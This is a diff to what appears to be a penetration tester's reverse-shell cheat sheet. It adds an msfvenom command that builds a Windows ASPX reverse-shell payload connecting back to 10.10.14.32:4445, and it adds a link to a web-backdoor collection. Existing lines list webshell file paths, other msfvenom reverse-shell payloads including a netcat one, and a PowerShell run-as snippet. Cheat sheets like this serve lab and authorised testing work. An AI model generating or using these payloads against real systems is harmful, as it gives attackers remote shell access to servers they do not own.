@@ -68,8 +68,11 @@
     /usr/share/webshells/cfm/cfexec.cfm
     /usr/share/webshells/perl/perl-reverse-shell.pl
 
-# ASP reverse shell
+# ASP reverse shell : nc
     msfvenom -p windows/shell_reverse_tcp LHOST=192.168.168.168 LPORT=443 -f asp -o shell.asp - also works for exporting .aspx
+
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.32 LPORT=4445 --platform windows -a x86 -e generic/none -f aspx -o reverse_shell.txt
+
 
 # Windows reverse shell
     echo $secpasswd = ConvertTo-SecureString "password" -AsPlainText -Force > wget-runas.ps1
@@ -145,4 +148,6 @@ msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.30 LPORT=4444 R
 
 # More to read
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors
 
